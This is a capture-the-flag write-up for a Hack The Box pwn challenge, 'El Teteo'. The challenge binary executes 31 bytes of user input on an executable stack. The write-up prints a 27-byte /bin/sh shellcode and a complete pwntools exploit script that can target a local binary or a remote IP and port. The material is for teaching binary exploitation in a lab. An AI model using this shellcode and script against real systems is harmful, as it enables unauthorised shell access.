---
title: "El Teteo 🔥 - Shellcode Injection Exploit Writeup"
tags: [HTB, binary exploitation, shellcode, stack exec, pwn]
---

# El Teteo 🔥

![pwntools](https://img.shields.io/badge/pwntools-✔️-brightgreen)
![Difficulty](https://img.shields.io/badge/difficulty-Easy-blue)
![Category](https://img.shields.io/badge/category-Pwn-orange)
![Challenge](https://img.shields.io/badge/Challenge-red)

El Teteo, a mischievous ghostly djinni born with a party spirit. You have one chance to summon it and make your wish—but only if it’s in the mood to grant it.

## 📚 Table of Contents
- [Binary Protections Analysis 🛡️](#binary-protections-analysis-️)
- [Program Behavior 📟](#program-behavior-)
- [Reverse Engineering 🔍](#reverse-engineering-)
- [Exploitation Strategy 💣](#exploitation-strategy-)
- [Full Exploit Script 🧨](#full-exploit-script-)
- [Exploitation Result ✅](#exploitation-result-)
- [Conclusion 🧾](#conclusion-)

## Binary Protections Analysis 🛡️

Let’s begin by checking the binary’s security protections using `checksec`.

![Checksec output](https://github.com/user-attachments/assets/ceec4776-f279-4c0b-9667-e0cc5f46a2e8)

**Findings:**
- ✅ Full RELRO  
- ✅ Stack Canary found  
- ❌ NX disabled  
- ✅ PIE enabled  
- ❌ No FORTIFY

## Program Behavior 📟

When we launch the binary, this is what it displays:

![Program Launch Output](https://github.com/user-attachments/assets/1a6f190f-eab5-4789-a89a-df1e661e643e)

A spooky looking ASCII pumpkin along with the text:

```
[!] I will do whatever you want, nice or naughty..
```

## Reverse Engineering 🔍

By decompiling the binary using **Ghidra**, we land in the `main()` function:

![Ghidra Decompiled Function](https://github.com/user-attachments/assets/c5c6f27e-8b4f-4be6-823b-84d24b0c2e96)

Two particularly interesting lines:

```c
read(0,&local_68,0x1f);
(*(code *)&local_68)();
```

This reads **31 bytes** from stdin and directly **executes** the buffer as code. 

Since NX is disabled, we can directly inject shellcode into the stack and it will be executed.

## Exploitation Strategy 💣

We need a shellcode that fits within **31 bytes**.

We can use this 27-byte shellcode from [shell-storm.org](https://shell-storm.org/shellcode/files/shellcode-806.html) which spawns `/bin/sh`:

```
\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05
```

## Full Exploit Script 🧨

```python
from pwn import *
import argparse

def main():
    parser = argparse.ArgumentParser(description="Exploit remote or local")
    parser.add_argument("-r", "--remote", help="Remote mode with IP and port", nargs=2, metavar=("IP", "PORT"))
    parser.add_argument("-l", "--local", help="Local mode with a binary", metavar="BINARY")
    args = parser.parse_args()

    if args.remote:
        ip, port = args.remote
        p = remote(ip, int(port))
    elif args.local:
        p = process(args.local)
    else:
        print("Please specify an execution mode (-r IP PORT or -l BINARY)")
        return
    
    shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
    print(f"Shellcode length: {len(shellcode)} bytes")
    
    p.sendlineafter(b'>', shellcode)
    p.interactive()

if __name__ == "__main__":
    main()
```

## Exploitation Result ✅

We run the exploit:

```
$ python3 exploit.py -l ./el_teteo
```

🎉 Result:

![Flag Output](https://github.com/user-attachments/assets/64507c3f-307f-4f7d-8d29-ff92d80662f4)

Flag captured:
```
HTB{f4k3_fl4g_f0r_t35t1ng}
```

## Conclusion 🧾

This challenge was a classic example of a **stack-based shellcode injection** made possible by:
- Disabled NX
- Direct execution of user input (`(*(code *)buffer)()`)

By keeping the shellcode under 31 bytes, we successfully popped a shell and retrieved the flag.

🔙 [Back to Challenges Writeups](../../)
